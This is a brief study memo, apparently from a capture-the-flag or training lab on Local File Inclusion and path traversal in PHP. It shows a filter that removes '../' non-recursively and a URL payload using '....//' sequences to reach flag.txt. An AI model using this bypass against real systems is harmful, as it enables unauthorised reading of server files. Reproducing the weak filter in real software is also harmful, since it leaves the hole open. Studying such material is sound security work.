# Lesson
- LFI (Local File Inclusion)
    - Path Traversal Deep Dive
- php
    - Wrappers 


# Memo
```php
$language = str_replace('../', '', $_GET['language']);
# can bypass with ....// -> ../
```
```
http://XXX.XXX.XXX.XXX:PORT/index.php?language=languages/....//....//....///....//flag.txt
```